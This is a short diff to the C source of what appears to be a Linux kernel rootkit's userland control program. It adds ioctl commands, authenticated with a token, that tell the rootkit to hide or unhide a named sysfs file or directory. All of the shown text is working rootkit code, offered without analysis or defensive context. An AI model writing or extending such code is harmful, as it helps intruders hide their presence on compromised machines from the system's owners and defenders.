@@ -255,6 +255,41 @@ int main ( int argc, char *argv[] )
             io = ioctl(sockfd, AUTH_TOKEN, &rk_args);
             break;
 
+        case 18:
+        case 19:
+        case 20:
+            break;
+
+        case 21:
+            {
+                char *name = argv[2];
+
+                printf("Hiding sysfs file/dir %s\n", name);
+
+                rk_file_args.name = name;
+                rk_file_args.namelen = strlen(name);
+                rk_args.cmd = 21;
+                rk_args.ptr = &rk_file_args;
+
+                io = ioctl(sockfd, AUTH_TOKEN, &rk_args);
+            }
+            break;
+
+        case 22:
+            {
+                char *name = argv[2];
+
+                printf("Unhiding sysfs file/dir %s\n", name);
+
+                rk_file_args.name = name;
+                rk_file_args.namelen = strlen(name);
+                rk_args.cmd = 22;
+                rk_args.ptr = &rk_file_args;
+
+                io = ioctl(sockfd, AUTH_TOKEN, &rk_args);
+            }
+            break;
+
         case 100:
             {
                 printf("Null command\n");
